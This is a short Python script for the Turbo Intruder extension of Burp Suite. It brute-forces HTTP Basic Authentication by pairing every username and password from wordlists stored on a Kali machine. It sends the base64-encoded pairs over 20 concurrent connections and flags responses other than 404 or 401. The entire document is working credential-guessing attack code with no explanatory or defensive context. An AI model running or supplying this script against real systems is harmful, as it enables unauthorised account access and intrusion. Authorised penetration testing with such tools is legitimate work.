# TurboIntruder Brute Force script for Basic Authentication
import base64

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for username in open('/home/kali/usernames.txt'):
        for password in open('/home/kali/passwords.txt'):
            credentials = username.rstrip() + ":" + password.rstrip()
            auth = base64.b64encode(credentials).decode('utf-8')
            engine.queue(target.req, auth)


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status not in [404,401]:
        table.add(req)
